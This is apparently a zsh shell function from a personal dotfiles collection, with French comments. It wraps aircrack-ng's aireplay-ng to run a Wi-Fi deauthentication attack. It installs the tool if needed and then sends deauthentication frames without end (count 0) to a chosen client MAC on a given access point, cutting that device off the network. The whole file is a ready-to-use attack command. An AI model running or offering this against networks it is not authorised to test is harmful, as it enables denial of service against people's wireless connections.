# DESC: Lance une attaque de désauthentification sur un réseau Wi-Fi cible
# USAGE: deauth_attack <interface> <cible_mac> <bssid>
deauth_attack() {
    # Vérifier et installer aircrack-ng si nécessaire
    UTILS_DIR="$HOME/dotfiles/zsh/functions/utils"
    if [ -f "$UTILS_DIR/ensure_tool.sh" ]; then
        source "$UTILS_DIR/ensure_tool.sh"
        ensure_tool aireplay-ng aircrack-ng || return 1
    fi
    
    local interface="$1"
    local target_mac="$2"
    local bssid="$3"
    
    if [ -z "$interface" ] || [ -z "$target_mac" ] || [ -z "$bssid" ]; then
        echo "Usage: deauth_attack <interface> <cible_mac> <bssid>"
        return 1
    fi
    
    sudo aireplay-ng --deauth 0 -a "$bssid" -c "$target_mac" "$interface"
}
